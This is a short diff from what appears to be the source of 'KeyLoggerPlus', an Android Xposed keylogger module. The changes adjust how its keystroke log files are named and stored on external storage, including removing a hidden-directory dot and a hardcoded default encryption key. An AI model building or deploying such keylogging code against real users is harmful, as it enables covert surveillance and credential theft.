@@ -9,7 +9,6 @@ import java.util.Date;
 
 import android.annotation.SuppressLint;
 import android.os.Environment;
-import android.support.annotation.Nullable;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.widget.EditText;
@@ -28,6 +27,8 @@ public class Hook implements IXposedHookZygoteInit {
 	public static final String mUseDate = "useDate";
 	public static final String mEncrypt = "encryption";
 	public static final String mEncryptKey = "encryptKey";
+	public static final String mEncryptKeyName = "encryptKeyName";
+
 
 
 	private BufferedWriter mWriter;
@@ -108,12 +109,12 @@ public class Hook implements IXposedHookZygoteInit {
 			 try{
 				 String ext = ".log";
 				 if(mXsp.getBoolean(mEncrypt, false)){
-					 ext = "." + mXsp.getString(mEncryptKey, "6677667766776677") + ".xlog";
+					 ext = "." + mXsp.getString(mEncryptKeyName, "Default") + ".xlog";
 				 }
 				 if(!mXsp.getBoolean(mUseDate, true))
-					 filePath = Environment.getExternalStorageDirectory() + File.separator + "." + mXsp.getString(mLogPath, "KeyLoggerPlus/logs" + ext);
+					 filePath = Environment.getExternalStorageDirectory() + File.separator + mXsp.getString(mLogPath, "KeyLoggerPlus/logs" + ext);
 				 else{
-					 filePath = Environment.getExternalStorageDirectory() + File.separator + "." + mXsp.getString(mLogPath, "KeyLoggerPlus") +
+					 filePath = Environment.getExternalStorageDirectory() + File.separator + mXsp.getString(mLogPath, "KeyLoggerPlus") +
 							 File.separator + "20" + currentDateTimeString.substring(6,8) + File.separator +
 							 currentDateTimeString.substring(3,5) + File.separator + currentDateTimeString.substring(0,2) + ext ;
 				 }
